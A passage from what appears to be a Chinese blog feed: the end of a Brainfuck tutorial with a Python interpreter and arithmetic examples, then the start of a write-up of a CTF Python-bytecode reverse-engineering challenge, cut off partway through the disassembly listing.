class="line">        ip = ip - <span class="number">1</span></span><br><span class="line">    <span class="keyword">elif</span> op == <span class="string">&#x27;&gt;&#x27;</span>:</span><br><span class="line">        op_inc_dp()</span><br><span class="line">    <span class="keyword">elif</span> op == <span class="string">&#x27;&lt;&#x27;</span>:</span><br><span class="line">        op_dec_dp()</span><br><span class="line">    <span class="keyword">elif</span> op == <span class="string">&#x27;[&#x27;</span>:</span><br><span class="line">        op_jmp_fwd()</span><br><span class="line">    <span class="keyword">elif</span> op == <span class="string">&#x27;]&#x27;</span>:</span><br><span class="line">        op_jmp_bck()</span><br><span class="line">    <span class="keyword">elif</span> op == <span class="string">&#x27;.&#x27;</span>:</span><br><span class="line">        op_out()</span><br><span class="line">    <span class="keyword">elif</span> op == <span class="string">&#x27;,&#x27;</span>:</span><br><span class="line">        op_in()</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span> (<span class="string">&#x27;invalid opcode&#x27;</span>)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    </span><br><span class="line"><span class="built_in">print</span> (out)</span><br><span class="line"><span class="built_in">str</span> = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> c <span class="keyword">in</span> out:</span><br><span class="line">    <span class="built_in">str</span> += <span class="string">&#x27;%c&#x27;</span>%(c)</span><br><span class="line"><span class="built_in">print</span> (<span class="built_in">str</span>)</span><br></pre></td></tr></table></figure><h2 id="四，BF的操作"><a href="#四，BF的操作" class="headerlink" title="四，BF的操作"></a>四，BF的操作</h2><p><strong>当前位置清零</strong></p><p>[-] 将当前指针的值归零</p><p><strong>之前位置清零</strong></p><p>[[-]&lt;] 将当前指针以及之前的指针归零</p><p><strong>字符I/O</strong></p><p>,. 从键盘读取一个字符并输出到屏幕上。</p><p><strong>简单的循环</strong></p><p>,[.,] 这是一个连续从键盘读取字符并<a href="https://baike.baidu.com/item/%E5%9B%9E%E6%98%BE">回显</a>到屏幕上的循环。注意，这里假定0表示输入结束，事实上有些系统并非如此。以-1和”未改变”作为判断依据的程序代码分别是”,+[-.,+]”和”,[.[-],]”。</p><p><strong>指针维护</strong></p><p>&gt;,[.&gt;,] 通过移动指针保存所有的输入，供后面的程序使用。</p><p><strong>加法</strong></p><p>[-&gt;+&lt;]</p><p>把当前位置的值加到后面的单元中（破坏性的加，它导致左边的单元被归零）。</p><h2 id="五，运算法则"><a href="#五，运算法则" class="headerlink" title="五，运算法则"></a>五，运算法则</h2><h2 id="条件指令"><a href="#条件指令" class="headerlink" title="条件指令"></a>条件指令</h2><figure class="highlight brainfuck"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">,</span>--<span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="title">[</span>--<span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="string">.</span><span class="string">,</span>--<span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="title">]</span></span><br></pre></td></tr></table></figure><p>这个程序会把从键盘读来的小写字符转换成大写。按回车键退出程序。</p><p>首先，我们通过，读入第一个字符并把它减10（大多数情况下，brainfuck使用10作为换行符的值）。如果用户按的是回车键，循环命令（[）就会直接跳转到程序的结尾：因为这时第一个字节已经被减到了零。如果输入的字符不是换行符（假设它是一个小写字符），程序进入循环。在这里我们再减去剩下的22，这样总共减掉32：这是ASCⅡ码中小写字符和大写字符的差值。</p><p>下面我们把它输出到屏幕。然后接收下一个输入字符，并减去10。如果它是换行符，退出循环；否则，再回到循环的开始，减去22并输出……当循环退出时，因为后面已经没有其他的指令，程序也随之终止。</p><h2 id="加法"><a href="#加法" class="headerlink" title="加法"></a>加法</h2><figure class="highlight bnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">,&gt;++++++[<span class="attribute">&lt;--------&gt;</span>-],,[<span class="attribute">&lt;+&gt;</span>-],<span class="attribute">&lt;.&gt;</span>.</span><br></pre></td></tr></table></figure><p>这个程序对两个一位数做加法，并输出结果（如果结果也只有一位数的话）：4+3</p><p>7 （现在程序开始有点复杂了。我们要涉及到数组中单元的内容了，比如[0]、[1]、[2]之类。）</p><p>第一个输入的数字被放在在[0]中，从中减去48来把它从ASCⅡ码值48到57转换为数值0到9：这是通过在[1]中放入6，然后按照[1]中的次数让一个循环从[0]中多次减去8来完成的（当加上或减去一个大的数值时，这是常用的办法）。下一步，加号被读入[1]中；然后，第二个数字被输入，覆盖掉加号。</p><p>下面的循环[&lt;+&gt;-]执行最重要的工作：通过把第二个数字移动到第一个里面让它们相加，并把[1]清空。这里的每次循环都把[0]增一并从[1]中减一；最终，在[1]被置零的多次循环中，[1]中的值就被转移到了[0]中。现在，[1]中是我们输入的换行符（这个程序里，我们没有设置对输入错误的检查机制）。</p><p>然后，指针被移回到指向[0]，并输出它的内容（[0]里面现在是 a + (b + 48） 的值，因为我们没有修改b的值，这等于 (a + b) + 48，也就是我们想要输出的ASCⅡ值）。然后，把指针指向[1]，里面保存着前面输入的换行符；输出换行符，程序结束。</p><h2 id="乘法"><a href="#乘法" class="headerlink" title="乘法"></a>乘法</h2><figure class="highlight bnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">，&gt;,,&gt;++++++++[<span class="attribute">&lt;------&lt;------&gt;</span>&gt;-]<span class="attribute">&lt;&lt;[&gt;</span>[&gt;+&gt;+<span class="attribute">&lt;&lt;-]&gt;</span>&gt;[<span class="attribute">&lt;&lt;+&gt;</span>&gt;-]<span class="attribute">&lt;&lt;&lt;-]&gt;</span>&gt;&gt;++++++[<span class="attribute">&lt;++++++++&gt;</span>-],<span class="attribute">&lt;.&gt;</span>.</span><br></pre></td></tr></table></figure><p>和前一个程序类似，不过这次是乘法而不是加法。</p><p>第一个输入的数字被放入[0]，星号和第二个数字被放入[1]，然后两个数值都被校正：减去48。</p><p>现在，程序进入了主循环。我们的基本思想是：每次从[0]中减去一，同时把[1]的值加入到保存乘积的[2]中。在实际操作中，第一个内层循环把[1]的值同时转移到[2]和[3]中，同时[1]清零（这是我们复制数字的基该方法）。下一个内层循环把[3]中的值重新放回到[1]，并清零[3]。然后从[0]中减一，结束外层循环。在退出这个循环时，[0]中为零，[1]仍然是输入的第二个数值，[2]则是这两个数值的和。（要是想保存第一个数，我们可以在外层循环中每次给[4]加一，最后把[4]移回[0]。）在结果中加48，并把换行符读入[3]，输出ASCII码的乘积，然后输出刚才保存的换行符。</p><h2 id="除法"><a href="#除法" class="headerlink" title="除法"></a>除法</h2><figure class="highlight brainfuck"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">，</span>&gt;<span class="string">,</span>&gt;++<span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="title">[</span><span class="literal">-</span>&lt;--<span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span>&lt;--<span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span>&gt;&gt;<span class="title">]</span></span><br></pre></td></tr></table></figure><p>从简单储存2个数字符到[0]和[1]，并各自减去48</p><p>&lt;&lt;[ 这是一个主循环，在被除数，也就是[0]的值为0后循环跳出</p><p>&gt;[-&gt;+&gt;+&lt;&lt;] 从单元1中复制除数除数/485249)的值到[2]和[3]，设[1]为0</p><p>&gt;[-&lt;&lt;- 被除数[1]减去除数[2]，结果将储存在[0]，并且[2]将归0</p><p>[&gt;]&gt;&gt;&gt;[&lt;[&gt;&gt;&gt;-&lt;&lt;&lt;[-]]&gt;&gt;]&lt;&lt;] 如果被除数[0]为0，跳出循环</p><p>&gt;&gt;&gt;+ 加1值商到[5]</p><p>&lt;&lt;[-&lt;&lt;+&gt;&gt;] 从[3]复制除数到[1]</p><p>&lt;&lt;&lt;] 移动指针到[0]</p><p>&gt;[-]&gt;&gt;&gt;&gt;[-&lt;&lt;&lt;&lt;&lt;+&gt;&gt;&gt;&gt;&gt;] 从[5]复制商到[0] （这步不是必须的，但会更清楚）</p><p>&lt;&lt;&lt;&lt;++++++[-&lt;++++++++&gt;]&lt;.</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;比赛做题的时候刚好遇到了这个语言，感觉非常的有意思，用8种字符就可以运算出来程序，学习一下&lt;/p&gt;
&lt;h1 id=&quot;brainfuck&quot;&gt;&lt;a href=&quot;#brainfuck&quot; class=&quot;headerlink&quot; title=&quot;brainfuck&quot;&gt;&lt;/a&gt;brainf</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>bytecode</title>
    <link href="http://example.com/2021/09/14/bytecode/"/>
    <id>http://example.com/2021/09/14/bytecode/</id>
    <published>2021-09-14T07:40:32.000Z</published>
    <updated>2021-09-14T08:06:16.183Z</updated>
    
    <content type="html"><![CDATA[<h1 id="羊城杯-2020-Bytecode"><a href="#羊城杯-2020-Bytecode" class="headerlink" title="[羊城杯 2020]Bytecode"></a>[羊城杯 2020]Bytecode</h1><p>看到题目是Bytecode，百度查看时Python字节码</p><p>官方文档：<a href="https://docs.python.org/zh-cn/3.7/library/dis.html">https://docs.python.org/zh-cn/3.7/library/dis.html</a></p><p>示例：给出函数 <code>myfunc()</code>:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">myfunc</span>(<span class="params">alist</span>):</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">len</span>(alist)</span><br></pre></td></tr></table></figure><p>可以使用以下命令显示 <code>myfunc()</code> 的反汇编</p><p>&gt;&gt;&gt;</p><figure class="highlight tap"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; dis.dis(myfunc)</span><br><span class="line"> <span class="number"> 2 </span>         <span class="number"> 0 </span>LOAD_GLOBAL             <span class="number"> 0 </span>(len)</span><br><span class="line">             <span class="number"> 2 </span>LOAD_FAST               <span class="number"> 0 </span>(alist)</span><br><span class="line">             <span class="number"> 4 </span>CALL_FUNCTION            1</span><br><span class="line">             <span class="number"> 6 </span>RETURN_VALUE</span><br></pre></td></tr></table></figure><p>(“2” 是行号)。</p><p>只能根据文档一个个反编译</p><figure class="highlight tap"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br></pre></td><td class="code"><pre><span class="line"><span class="number"> 4 </span>         <span class="number"> 0 </span>LOAD_CONST              <span class="number"> 0 </span>(3)</span><br><span class="line">            <span class="number"> 3 </span>LOAD_CONST              <span class="number"> 1 </span>(37)</span><br><span class="line">            <span class="number"> 6 </span>LOAD_CONST              <span class="number"> 2 </span>(72)</span><br><span class="line">            <span class="number"> 9 </span>LOAD_CONST              <span class="number"> 3 </span>(9)</span><br><span class="line">           <span class="number"> 12 </span>LOAD_CONST              <span class="number"> 4 </span>(6)</span><br><span class="line">           <span class="number"> 15 </span>LOAD_CONST              <span class="number"> 5 </span>(132)</span><br><span class="line">           <span class="number"> 18 </span>BUILD_LIST               6</span><br><span class="line">           <span class="number"> 21 </span>STORE_NAME              <span class="number"> 0 </span>(en)</span><br><span class="line"></span><br><span class="line"><span class="number"> 5 </span>        <span class="number"> 24 </span>LOAD_CONST              <span class="number"> 6 </span>(101)</span><br><span class="line">           <span class="number"> 27 </span>LOAD_CONST              <span class="number"> 7 </span>(96)</span><br><span class="line">           <span class="number"> 30 </span>LOAD_CONST              <span class="number"> 8 </span>(23)</span><br><span class="line">           <span class="number"> 33 </span>LOAD_CONST              <span class="number"> 9 </span>(68)</span><br><span class="line">           <span class="number"> 36 </span>LOAD_CONST             <span class="number"> 10 </span>(112)</span><br><span class="line">           <span class="number"> 39 </span>LOAD_CONST             <span class="number"> 11 </span>(42)</span><br><span class="line">           <span class="number"> 42 </span>LOAD_CONST             <span class="number"> 12 </span>(107)</span><br><span class="line">           <span class="number"> 45 </span>LOAD_CONST             <span class="number"> 13 </span>(62)</span><br><span class="line">           <span class="number"> 48 </span>LOAD_CONST              <span class="number"> 7 </span>(96)</span><br><span class="line">           <span class="number"> 51 </span>LOAD_CONST             <span class="number"> 14 </span>(53)</span><br><span class="line">           <span class="number"> 54 </span>LOAD_CONST             <span class="number"> 15 </span>(176)</span><br><span class="line">           <span class="number"> 57 </span>LOAD_CONST             <span class="number"> 16 </span>(179)</span><br><span class="line">           <span class="number"> 60 </span>LOAD_CONST             <span class="number"> 17 </span>(98)</span><br><span class="line">           <span class="number"> 63 </span>LOAD_CONST             <span class="number"> 14 </span>(53)</span><br><span class="line">           <span class="number"> 66 </span>LOAD_CONST             <span class="number"> 18 </span>(67)</span><br><span class="line">           <span class="number"> 69 </span>LOAD_CONST             <span class="number"> 19 </span>(29)</span><br><span class="line">           <span class="number"> 72 </span>LOAD_CONST             <span class="number"> 20 </span>(41)</span><br><span class="line">           <span class="number"> 75 </span>LOAD_CONST             <span class="number"> 21 </span>(120)</span><br><span class="line">           <span class="number"> 78 </span>LOAD_CONST             <span class="number"> 22 </span>(60)</span><br><span class="line">           <span class="number"> 81 </span>LOAD_CONST             <span class="number"> 23 </span>(106)</span><br><span class="line">           <span class="number"> 84 </span>LOAD_CONST             <span class="number"> 24 </span>(51)</span><br><span class="line">           <span class="number"> 87 </span>LOAD_CONST              <span class="number"> 6 </span>(101)</span><br><span class="line">           <span class="number"> 90 </span>LOAD_CONST             <span class="number"> 25 </span>(178)</span><br><span class="line">           <span class="number"> 93 </span>LOAD_CONST             <span class="number"> 26 </span>(189)</span><br><span class="line">           <span class="number"> 96 </span>LOAD_CONST              <span class="number"> 6 </span>(101)</span><br><span class="line">           <span class="number"> 99 </span>LOAD_CONST             <span class="number"> 27 </span>(48)</span><br><span class="line">          <span class="number"> 102 </span>BUILD_LIST              26</span><br><span class="line">          <span class="number"> 105 </span>STORE_NAME              <span class="number"> 1 </span>(output)</span><br><span class="line"></span><br><span class="line"><span class="number"> 7 </span>       <span class="number"> 108 </span>LOAD_CONST             <span class="number"> 28 </span>(&#x27;welcome to GWHT2020&#x27;)</span><br><span class="line">          <span class="number"> 111 </span>PRINT_ITEM          </span><br><span class="line">          <span class="number"> 112 </span>PRINT_NEWLINE       </span><br><span class="line"></span><br><span class="line"><span class="number"> 9 </span>       <span class="number"> 113 </span>LOAD_NAME               <span class="number"> 2 </span>(raw_input)</span><br><span class="line">          <span class="number"> 116 </span>LOAD_CONST             <span class="number"> 29 </span>(&#x27;please input your flag:&#x27;)</span><br><span class="line">          <span class="number"> 119 </span>CALL_FUNCTION            1</span><br><span class="line">          <span class="number"> 122 </span>STORE_NAME              <span class="number"> 3 </span>(flag)</span><br><span class="line"></span><br><span class="line">10        <span class="number"> 125 </span>LOAD_NAME               <span class="number"> 3 </span>(flag)</span><br><span class="line">          <span class="number"> 128 </span>STORE_NAME              <span class="number"> 4 </span>(str)</span><br><span class="line"></span><br><span class="line">12        <span class="number"> 131 </span>LOAD_NAME               <span class="number"> 5 </span>(len)</span><br><span class="line">          <span class="number"> 134 </span>LOAD_NAME               <span class="number"> 4 </span>(str)</span><br><span class="line">          <span class="number"> 137 </span>CALL_FUNCTION            1</span><br><span class="line">          <span class="number"> 140 </span>STORE_NAME              <span class="number"> 6 </span>(a)</span><br><span class="line"></span><br><span class="line">13        <span class="number"> 143 </span>LOAD_NAME               <span class="number"> 6 </span>(a)</span><br><span class="line">          <span class="number"> 146 </span>LOAD_CONST             <span class="number"> 30 </span>(38)</span><br><span class="line">          <span class="number"> 149 </span>COMPARE_OP              <span class="number"> 0 </span>(&lt;)</span><br><span class="line">          <span class="number"> 152 </span>POP_JUMP_IF_FALSE      173</span><br><span class="line"></span><br><span class="line">14        <span class="number"> 155 </span>LOAD_CONST             <span class="number"> 31 </span>(&#x27;lenth wrong!&#x27;)</span><br><span class="line">          <span class="number"> 158 </span>PRINT_ITEM          </span><br><span class="line">          <span class="number"> 159 </span>PRINT_NEWLINE       </span><br><span class="line"></span><br><span class="line">15        <span class="number"> 160 </span>LOAD_NAME               <span class="number"> 7 </span>(exit)</span><br><span class="line">          <span class="number"> 163 </span>LOAD_CONST             <span class="number"> 32 </span>(0)</span><br><span class="line">          <span class="number"> 166 </span>CALL_FUNCTION            1</span><br><span class="line">          <span class="number"> 169 </span>POP_TOP             </span><br><span class="line">          <span class="number"> 170 </span>JUMP_FORWARD            <span class="number"> 0 </span>(to 173)</span><br><span class="line"></span><br><span class="line">17     &gt;&gt; <span class="number"> 173 </span>LOAD_NAME               <span class="number"> 8 </span>(ord)</span><br><span class="line">          <span class="number"> 176 </span>LOAD_NAME               <span class="number"> 4 </span>(str)</span><br><span class="line">          <span class="number"> 179 </span>LOAD_CONST             <span class="number"> 32 </span>(0)</span><br><span class="line">          <span class="number"> 182 </span>BINARY_SUBSCR       </span><br><span class="line">          <span class="number"> 183 </span>CALL_FUNCTION            1</span><br><span class="line">          <span class="number"> 186 </span>LOAD_CONST             <span class="number"> 33 </span>(2020)</span><br><span class="line">          <span class="number"> 189 </span>BINARY_MULTIPLY     </span><br><span class="line">          <span class="number"> 190 </span>LOAD_NAME               <span class="number"> 8 </span>(ord)</span><br><span class="line">          <span class="number"> 193 </span>LOAD_NAME               <span class="number"> 4 </span>(str)</span><br><span class="line">          <span class="number"> 196 </span>LOAD_CONST             <span class="number"> 34 </span>(1)</span><br><span class="line">          <span class="number"> 199 </span>BINARY_SUBSCR       </span><br><span class="line">          <span class="number"> 200 </span>CALL_FUNCTION            1</span><br><span class="line">          <span class="number"> 203 </span>BINARY_ADD          </span><br><span class="line">          <span class="number"> 204 </span>LOAD_CONST             <span class="number"> 33 </span>(2020)</span><br><span class="line">          <span class="number"> 207 </span>BINARY_MULTIPLY     </span><br><span class="line">          <span class="number"> 208 </span>LOAD_NAME               <span class="number"> 8 </span>(ord)</span><br><span class="line">          <span class="number"> 211 </span>LOAD_NAME               <span class="number"> 4 </span>(str)</span><br><span class="line">          <span class="number"> 214 </span>LOAD_CONST             <span class="number"> 35 </span>(2)</span><br><span class="line">          <span class="number"> 217 </span>BINARY_SUBSCR       </span><br><span class="line">          <span class="number"> 218 </span>CALL_FUNCTION            1</span><br><span class="line">          <span class="number"> 221 </span>BINARY_ADD          </span><br><span class="line">          <span class="number"> 222 </span>LOAD_CONST             <span class="number"> 33 </span>(2020)</span><br><span class="line">          <span class="number"> 225 </span>BINARY_MULTIPLY     </span><br><span class="line">          <span class="number"> 226 </span>LOAD_NAME               <span class="number"> 8 </span>(ord)</span><br><span class="line">          <span class="number"> 229 </span>LOAD_NAME               <span class="number"> 4 </span>(str)</span><br><span class="line">          <span class="number"> 232 </span>LOAD_CONST              <span class="number"> 0 </span>(3)</span><br><span class="line">          <span class="number"> 235 </span>BINARY_SUBSCR       </span><br><span class="line">          <span class="number"> 236 </span>CALL_FUNCTION            1</span><br><span class="line">          <span class="number"> 239 </span>BINARY_ADD          </span><br><span class="line">          <span class="number"> 240 </span>LOAD_CONST             <span class="number"> 33 </span>(2020)</span><br><span class="line">          <span class="number"> 243 </span>BINARY_MULTIPLY     </span><br><span class="line">          <span class="number"> 244 </span>LOAD_NAME               <span class="number"> 8 </span>(ord)</span><br><span class="line">          <span class="number"> 247 </span>LOAD_NAME               <span class="number"> 4 </span>(str)</span><br><span class="line">          <span class="number"> 250 </span>LOAD_CONST             <span class="number"> 36 </span>(4)</span><br><span class="line">          <span class="number"> 253 </span>BINARY_SUBSCR       </span><br><span class="line">          <span class="number"> 254 </span>CALL_FUNCTION            1</span><br><span class="line">          <span class="number"> 257 </span>BINARY_ADD          </span><br><span class="line">          <span class="number"> 258 </span>LOAD_CONST             <span class="number"> 37 </span>(1182843538814603)</span><br><span class="line">          <span class="number"> 261 </span>COMPARE_OP              <span class="number"> 2 </span>(==)</span><br><span class="line">          <span class="number"> 264 </span>POP_JUMP_IF_FALSE      275</span><br><span class="line"></span><br><span class="line">18        <span class="number"> 267 </span>LOAD_CONST             <span class="number"> 38 </span>(&#x27;good!continue\xe2\x80\xa6\xe2\x80\xa6&#x27;)</span><br><span class="line">          <span class="number"> 270 </span>PRINT_ITEM          </span><br><span class="line">          <span class="number"> 271 </span>PRINT_NEWLINE       </span><br><span class="line">          <span class="number"> 272 </span>JUMP_FORWARD           <span class="number"> 15 </span>(to 290)</span><br><span class="line"></span><br><span class="line">20     &gt;&gt; <span class="number"> 275 </span>LOAD_CONST             <span class="number"> 39 </span>(&#x27;bye~&#x27;)</span><br><span class="line">          <span class="number"> 278 </span>PRINT_ITEM          </span><br><span class="line">          <span class="number"> 279 </span>PRINT_NEWLINE       </span><br><span class="line"></span><br><span class="line">21        <span class="number"> 280 </span>LOAD_NAME               <span class="number"> 7 </span>(exit)</span><br><span class="line">          <span class="number"> 283 </span>LOAD_CONST             <span class="number"> 32 </span>(0)</span><br><span class="line">          <span class="number"> 286 </span>CALL_FUNCTION            1</span><br><span class="line">          <span class="number"> 289 </span>POP_TOP             </span><br><span class="line"></span><br><span class="line">23     &gt;&gt; <span class="number"> 290 